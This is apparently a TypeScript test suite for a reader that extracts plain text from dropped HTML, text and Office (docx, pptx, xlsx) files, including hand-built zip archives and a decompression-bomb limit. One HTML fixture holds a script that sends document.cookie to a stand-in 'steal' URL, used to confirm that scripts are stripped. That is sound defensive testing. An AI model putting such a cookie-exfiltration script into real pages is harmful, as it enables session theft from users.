import { describe, expect, test } from 'bun:test';
import { deflateRawSync } from 'node:zlib';
import {
  NOTCH_DROP_TEXT_MAX, NOTCH_DROP_UNPACK_MAX, decodeEntities, docxText, htmlToText, pptxText, readDropped, tidyText, xlsxText, zipParts, zipRead,
} from './drop-read.ts';

/** A zip as Office writes one: each part deflated, then the list of parts, then the end record. */
function zip(files: Record<string, string>, options: { store?: boolean; encrypted?: boolean } = {}): Uint8Array {
  const chunks: Buffer[] = [];
  const central: Buffer[] = [];
  let offset = 0;
  for (const [name, content] of Object.entries(files)) {
    const raw = Buffer.from(content);
    const data = options.store ? raw : deflateRawSync(raw);
    const nameBytes = Buffer.from(name);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(options.encrypted ? 1 : 0, 6);
    local.writeUInt16LE(options.store ? 0 : 8, 8);
    local.writeUInt32LE(data.length, 18);
    local.writeUInt32LE(raw.length, 22);
    local.writeUInt16LE(nameBytes.length, 26);
    chunks.push(local, nameBytes, data);
    const entry = Buffer.alloc(46);
    entry.writeUInt32LE(0x02014b50, 0);
    entry.writeUInt16LE(options.encrypted ? 1 : 0, 8);
    entry.writeUInt16LE(options.store ? 0 : 8, 10);
    entry.writeUInt32LE(data.length, 20);
    entry.writeUInt32LE(raw.length, 24);
    entry.writeUInt16LE(nameBytes.length, 28);
    entry.writeUInt32LE(offset, 42);
    central.push(entry, nameBytes);
    offset += 30 + nameBytes.length + data.length;
  }
  const list = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(Object.keys(files).length, 8);
  end.writeUInt16LE(Object.keys(files).length, 10);
  end.writeUInt32LE(list.length, 12);
  end.writeUInt32LE(offset, 16);
  return new Uint8Array(Buffer.concat([...chunks, list, end]));
}

const docx = (body: string): Uint8Array => zip({
  '[Content_Types].xml': '<Types/>',
  'word/document.xml': `<?xml version="1.0"?><w:document xmlns:w="x"><w:body>${body}</w:body></w:document>`,
});

describe('a web page, as its words', () => {
  test('what a person would read, a line for each block, with scripts and styles thrown away unread', () => {
    const page = `<!doctype html><html><head><title>Q3 &amp; Q4 plan</title><style>body{color:red}</style>
      <script>fetch('https://example.invalid/steal?c=' + document.cookie)</script></head>
      <body><!-- a note --><h1>Q3 &amp; Q4 plan</h1><p>Installs are up <b>12%</b>&nbsp;on last week.</p>
      <ul><li>Fix the notch</li><li>Ship pass&#160;9</li></ul>
      <table><tr><th>Month</th><th>Installs</th></tr><tr><td>Oct</td><td>1,146</td></tr></table>
      <script>alert(1)</script></body></html>`;
    expect(htmlToText(page)).toBe('Q3 & Q4 plan\nInstalls are up 12% on last week.\n- Fix the notch\n- Ship pass 9\nMonth | Installs |\nOct | 1,146 |');
    expect(htmlToText(page)).not.toContain('cookie');
    expect(htmlToText(page)).not.toContain('color:red');
  });

  test('a page whose script was never closed gives none of it, and a title the page does not repeat is put first', () => {
    expect(htmlToText('<p>Before</p><script>var secret = "x";')).toBe('Before');
    expect(htmlToText('<title>Receipt 114</title><body><p>Paid in full.</p></body>')).toBe('Receipt 114\n\nPaid in full.');
  });

  test('marks for characters are the characters, and a mark for a control character is not one', () => {
    expect(decodeEntities('a &lt; b &amp;&amp; c &gt; d &quot;x&quot; &#39;y&#39; &#x20AC;5 &euro;6 &unknown; &#0; &#xD800;')).toBe('a < b && c > d "x" \'y\' €5 €6 &unknown;    ');
  });

  test('text is made fit to carry: no control characters, no runs of empty lines', () => {
    expect(tidyText('a\u0000b\r\n\r\n\r\n\r\nc  \t d \n')).toBe('a b\n\nc d');
  });
});

describe('a zip, as far as an Office file needs one', () => {
  test('lists its parts and unpacks one, stored or deflated', () => {
    for (const store of [false, true]) {
      const bytes = zip({ 'a.txt': 'hello', 'dir/b.xml': '<x>world</x>' }, { store });
      const parts = zipParts(bytes)!;
      expect(parts.map((part) => part.name)).toEqual(['a.txt', 'dir/b.xml']);
      expect(new TextDecoder().decode(zipRead(bytes, parts[1]!)!)).toBe('<x>world</x>');
    }
  });

  test('what is not a zip, is damaged, or is locked with a password is nothing', () => {
    expect(zipParts(new Uint8Array([1, 2, 3]))).toBeNull();
    expect(zipParts(new TextEncoder().encode('just some text that is long enough to hold an end record'))).toBeNull();
    expect(zipParts(zip({ 'a.txt': 'hello' }, { encrypted: true }))).toBeNull();
    const cut = zip({ 'a.txt': 'hello world hello world' });
    const parts = zipParts(cut)!;
    cut.fill(0, 30, 44);
    expect(zipRead(cut, parts[0]!)).toBeNull();
  });

  // A few kilobytes can claim to unpack to anything.
  test('a part that would unpack past the limit is not unpacked', () => {
    const bomb = zip({ 'big.xml': 'a'.repeat(1024) });
    const [part] = zipParts(bomb)!;
    expect(zipRead(bomb, { ...part!, size: NOTCH_DROP_UNPACK_MAX + 1 })).toBeNull();
    expect(zipRead(bomb, part!)!.length).toBe(1024);
  });
});

describe('a Word document, as its words', () => {
  test('a line for each paragraph, runs joined, tabs and breaks kept', () => {
    const bytes = docx(
      '<w:p><w:r><w:t>Offer for </w:t></w:r><w:r><w:rPr><w:b/></w:rPr><w:t xml:space="preserve">Lumen &amp; Co</w:t></w:r></w:p>'
      + '<w:p><w:r><w:t>Seats</w:t><w:tab/><w:t>5</w:t><w:br/><w:t>Start: 1 December</w:t></w:r></w:p><w:p></w:p>');
    expect(docxText(bytes)).toBe('Offer for Lumen & Co\nSeats 5\nStart: 1 December');
  });

  test('a file that only has the name of one is not one', () => {
    expect(docxText(zip({ 'word/other.xml': '<x/>' }))).toBeNull();
    expect(docxText(new TextEncoder().encode('not a zip at all, whatever the name says, not a zip'))).toBeNull();
  });
});

describe('a deck, as its words', () => {
  test('what each slide says, slide by slide, in their order', () => {
    const slide = (lines: string[]): string => `<p:sld xmlns:a="x">${lines.map((line) => `<a:p><a:r><a:t>${line}</a:t></a:r></a:p>`).join('')}</p:sld>`;
    const bytes = zip({
      'ppt/slides/slide10.xml': slide(['Thank you']),
      'ppt/slides/slide2.xml': slide(['Installs', '1,284 this week']),
      'ppt/slides/slide1.xml': slide(['Pillow', 'Seed round']),
      'ppt/slides/_rels/slide1.xml.rels': '<Relationships/>',
    });
    expect(pptxText(bytes)).toBe('Slide 1:\nPillow\nSeed round\n\nSlide 2:\nInstalls\n1,284 this week\n\nSlide 10:\nThank you');
    expect(pptxText(zip({ 'ppt/presentation.xml': '<x/>' }))).toBeNull();
  });
});

describe('a spreadsheet, as its words', () => {
  const book = (): Uint8Array => zip({
    'xl/workbook.xml': '<workbook><sheets><sheet name="Payouts" sheetId="1"/><sheet name="Notes &amp; more" sheetId="2"/></sheets></workbook>',
    'xl/sharedStrings.xml': '<sst><si><t>Customer</t></si><si><t>Net</t></si><si><r><t>Acme, </t></r><r><t>Inc</t></r></si><si><t>Lumen</t></si></sst>',
    'xl/worksheets/sheet1.xml': '<worksheet><sheetData>'
      + '<row r="1"><c r="A1" t="s"><v>0</v></c><c r="B1" t="s"><v>1</v></c></row>'
      + '<row r="2"><c r="A2" t="s"><v>2</v></c><c r="B2"><v>120</v></c></row>'
      + '<row r="3"><c r="A3" t="s"><v>3</v></c><c r="C3"><v>740.5</v></c><c r="D3" t="b"><v>1</v></c></row>'
      + '<row r="4"><c r="A4" s="1"/></row>'
      + '</sheetData></worksheet>',
    'xl/worksheets/sheet2.xml': '<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Paid on the 3rd</t></is></c></row></sheetData></worksheet>',
  });

  test('each sheet by its name, each row a line, cells in their columns', () => {
    expect(xlsxText(book())).toBe(
      'Sheet: Payouts\nCustomer,Net\n"Acme, Inc",120\nLumen,,740.5,TRUE\n\nSheet: Notes & more\nPaid on the 3rd');
  });

  test('an empty sheet says so, and a file that is not a workbook is nothing', () => {
    const empty = zip({ 'xl/workbook.xml': '<workbook><sheets><sheet name="Blank"/></sheets></workbook>', 'xl/worksheets/sheet1.xml': '<worksheet><sheetData/></worksheet>' });
    expect(xlsxText(empty)).toBe('Sheet: Blank\n(empty)');
    expect(xlsxText(zip({ 'xl/styles.xml': '<x/>' }))).toBeNull();
  });
});

describe('a dropped file, read as what its name says it is', () => {
  const bytes = (text: string): Uint8Array => new TextEncoder().encode(text);

  test('each kind by its own reading', () => {
    expect(readDropped('html', bytes('<p>Paid in <b>full</b>.</p>'))).toEqual({ text: 'Paid in full.', cut: false });
    // Settings and code keep how far each line is set in: in YAML that is the meaning.
    expect(readDropped('text', bytes('recording:\r\n  format: mkv   \r\n\tpath: D:\\Videos\u0000\r\n\r\n'))).toEqual({ text: 'recording:\n  format: mkv\n\tpath: D:\\Videos', cut: false });
    expect(readDropped('docx', docx('<w:p><w:r><w:t>Hello</w:t></w:r></w:p>'))).toEqual({ text: 'Hello', cut: false });
  });

  test('a long file is cut, and says that it goes on', () => {
    const read = readDropped('text', bytes('word '.repeat(60_000)))!;
    expect(read.cut).toBe(true);
    expect(read.text.length).toBeLessThan(NOTCH_DROP_TEXT_MAX + 80);
    expect(read.text.endsWith('(The file goes on. Only this first part was read.)')).toBe(true);
  });

  test('what cannot be read as that kind is nothing: no words, not text at all, or not the file its name says', () => {
    expect(readDropped('html', bytes('<script>var x = 1;</script>'))).toBeNull();
    expect(readDropped('text', new Uint8Array(0))).toBeNull();
    expect(readDropped('text', new Uint8Array(400).fill(0xff))).toBeNull();
    expect(readDropped('docx', bytes('this is not a zip, whatever the end of its name says about it'))).toBeNull();
    expect(readDropped('xlsx', docx('<w:p/>'))).toBeNull();
  });
});
